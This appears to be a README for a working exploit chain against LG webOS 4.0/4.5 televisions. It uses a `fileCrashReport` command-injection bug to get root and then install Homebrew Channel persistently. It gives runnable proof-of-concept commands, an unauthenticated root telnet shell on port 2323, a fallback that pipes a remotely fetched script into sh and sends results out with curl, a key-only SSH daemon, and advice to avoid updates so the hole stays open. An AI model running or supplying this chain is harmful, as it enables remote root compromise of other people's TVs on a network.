# From the one-shot to a rooted TV

The `fileCrashReport` bug gives **one root command per call**. This document describes how to
turn it into a usable shell, then into persistent root with Homebrew Channel, on webOS 4.0/4.5
(2018–2019 TVs).

## 0. Confirm the primitive

```sh
python3 poc/poc.py --tv <TV_IP> --local-ip <MAC_IP> --utc <build_epoch>
```

Expected: `RESULT: uid=0(root) gid=0(root) ...`. If this fails, stop here.

## 1. Usable root shell

The 4.0/4.5 rootfs contains the busybox `telnetd` applet, `curl` and `wget`. Start a root telnet:

```sh
python3 poc/poc.py --tv <TV_IP> --local-ip <MAC_IP> --utc <build_epoch> \
  --cmd 'busybox telnetd -l /bin/sh -p 2323'
nc <TV_IP> 2323
```

`busybox telnetd` daemonizes and the injected command returns. If `/dev/pts` is missing, the
fallback is to inject a fetched script (`--cmd 'curl -s <MAC>:<PORT>/root.sh|sh'`) and exfiltrate
results with `curl`.

## 2. Persistent root + Homebrew Channel

The repository automates this with `--root`:

```sh
python3 poc/poc.py --tv <TV_IP> --local-ip <MAC_IP> --utc <build_epoch> --root \
  --hb-ipk ~/Downloads/org.webosbrew.hbchannel_0.7.3_all.ipk \
  --ssh-pubkey ~/.ssh/id_ed25519.pub \
  --telnet
```

What `poc/root.sh` does, in order:

1. `mkdir -p /var/luna/preferences/devmode_enabled`
2. `restart appinstalld` (fallback `killall appinstalld`)
3. downloads the IPK from the harness to `/tmp/hbchannel.ipk`
4. `luna-send -n 1 -w 30000 -f luna://com.webos.appInstallService/dev/install ...`
5. runs `/media/developer/apps/usr/palm/services/org.webosbrew.hbchannel.service/elevate-service`
6. installs the SSH public key and starts `dropbear -R -p 22 -s` (key-only)
7. optionally starts `busybox telnetd -l /bin/sh -p 2323`
8. queries `getConfiguration` and reports `ROOT_DONE`

Each step is reported to the harness (`RESULT:` lines), so a failure is visible without a shell.

### Manual equivalent

From the root shell, the same steps are:

```sh
mkdir -p /var/luna/preferences/devmode_enabled
restart appinstalld
curl -s -o /tmp/hbchannel.ipk http://<MAC>:<PORT>/hb.ipk
luna-send -n 1 -w 30000 -f luna://com.webos.appInstallService/dev/install \
  '{"id":"com.ares.defaultName","ipkUrl":"/tmp/hbchannel.ipk","subscribe":true}'
/media/developer/apps/usr/palm/services/org.webosbrew.hbchannel.service/elevate-service
luna-send -n 1 -f luna://org.webosbrew.hbchannel.service/getConfiguration '{}'
```

Expected after install: `"root": true`.

## 3. Verify

```sh
ssh -i ~/.ssh/id_ed25519 root@<TV_IP> 'id; uptime'
```

or, with `--telnet`, `nc <TV_IP> 2323` then `id`.

After a reboot:

- the bugreport service is still present on 4.0/4.5, so root remains recoverable;
- Homebrew Channel should still be installed;
- SSH is not started automatically unless the Homebrew service is started at boot; use the
  Homebrew app or `dropbear` after each boot if needed.

## 4. Rollback

```sh
# from a root shell
luna-send -n 1 -f luna://com.webos.appInstallService/remove '{"id":"org.webosbrew.hbchannel"}'
rm -rf /var/luna/preferences/devmode_enabled /home/root/.ssh
# then reboot
```

`/var/luna/preferences/devmode_enabled` is what allows dev apps; removing it and rebooting
returns the TV to its stock state (apart from any other changes you made).

## 5. Caveats

- **Do not create** `/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service/start-devmode.sh`
  unless it has a valid LG signature: at boot, `devmode.conf` deletes `devmode_enabled` and
  `/media/developer` when verification fails.
- The build-age gate (5 days by default) applies to **each** `fileCrashReport` call. If the clock
  returns to network time, re-run the `setSystemTime` step before the next call.
- Do not update the TV to webOS 5.0+: the bugreport service is removed there, closing this vector.
- `dev/install` may require `devmode_enabled`; the script creates it first.
- The install can take tens of seconds; the script waits and reports the resulting state.
